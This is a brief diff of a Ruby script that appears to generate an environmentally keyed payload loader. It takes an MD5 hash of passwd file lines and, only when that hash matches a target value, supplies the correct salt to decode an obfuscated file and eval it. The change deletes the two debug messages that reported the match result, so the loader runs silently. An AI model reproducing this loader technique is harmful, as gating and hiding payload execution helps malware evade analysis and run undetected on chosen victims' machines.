@@ -24,10 +24,8 @@ end
 hash = Digest::MD5.hexdigest(passwd_lines)
 
 if hash == var_hash_match
-  puts "Match is correct"
   code = %{require '#{var_obf}'; Obfuscate.setup { |c| c.salt = '#{yum_yum}'; c.mode = :string }; #{var_code} = Obfuscate.clarify(File.read('#{var_server}')); eval(#{var_code})}
 else
-  puts "Match is not correct"
   code = %{require '#{var_obf}'; Obfuscate.setup { |c| c.salt = '#{yuck_yuck}'; c.mode = :string }; #{var_code} = Obfuscate.clarify(File.read('#{var_server}')); eval(#{var_code})}
 end
 
